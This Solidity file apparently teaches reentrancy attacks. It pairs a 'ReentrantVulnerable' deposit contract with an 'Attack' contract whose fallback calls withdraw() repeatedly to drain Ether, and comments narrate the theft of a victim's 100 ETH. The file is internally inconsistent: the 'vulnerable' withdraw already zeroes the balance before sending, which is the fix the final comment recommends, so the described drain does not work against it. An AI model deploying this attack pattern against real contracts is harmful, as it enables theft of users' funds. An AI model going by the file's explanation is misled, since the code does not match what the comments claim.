// SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

contract ReentrantVulnerable {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

// easy way
// mutex lock using openZeppeline
    function withdraw() payable public {
        uint256 bal = balances[msg.sender];
        require(bal > 0);
        balances[msg.sender] = 0;
        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract Attack {
    ReentrantVulnerable public reentrantVulnerable;

    constructor(address _reentrantVulnerable) {
        reentrantVulnerable = ReentrantVulnerable(_reentrantVulnerable);
    }

    function attack() external payable {
        reentrantVulnerable.deposit{value: 1 ether}();
        reentrantVulnerable.withdraw();
    }

    fallback() external payable {
        if (address(reentrantVulnerable).balance >= 1 ether) {
            reentrantVulnerable.withdraw();
        }
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

//1. Let say you are Alice and you have deposited 100ETH in the contract
//2. Now Bob want to attack the contract then he deploy the Attack contract by passing the address of the
// contract where Alice's ETH is stored.
//3. Now Bob will use the attack function.
// FLOW OF ATTACK FUNCTION
// -> Calls the deposit function and deposit 1ETH because the balance should be 1ETH so that the withdraw function will work.
// -> After depositing 1ETH the attack function will call withdraw function.
// -> In the First Contract Withdraw function first check if the deposit of the caller is more than 0ETH.
// -> then withdraw function runs the msg.sender.call function which is the worst problem.
// -> this msg.sender.call is calling the contract from where is hasbeen called then in the attack contract that call be be handled by
//    the fallback function, and that fallback function again call the withdraw function then this recursion goes on and on which causes 
// loosing of all the money from the contarct. and balance of attacked contract be become zero.

// #######Best practice is to first update the balance to zero then transfer the funds############//